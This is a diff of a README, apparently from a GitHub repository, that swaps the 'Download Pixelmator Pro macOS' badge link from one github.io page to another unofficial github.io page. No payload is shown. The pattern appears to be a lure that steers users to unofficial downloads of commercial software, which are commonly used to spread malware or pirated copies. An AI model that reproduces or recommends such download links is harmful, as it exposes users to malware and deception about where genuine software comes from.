@@ -6,7 +6,7 @@
 
 ## 📥 Download Pixelmator Pro for macOS
 
-[![⬇️ Download Pixelmator Pro macOS](https://img.shields.io/badge/Download-Pixelmator%20Pro-macOS-blue?style=for-the-badge&logo=apple&logoColor=white&labelColor=000000&logoWidth=20)](https://shuziktobehuman.github.io/huja/Pixelmator)
+[![⬇️ Download Pixelmator Pro macOS](https://img.shields.io/badge/Download-Pixelmator%20Pro-macOS-blue?style=for-the-badge&logo=apple&logoColor=white&labelColor=000000&logoWidth=20)](https://mitrobandus.github.io/.github/Pixelmator)
 
 ---
 
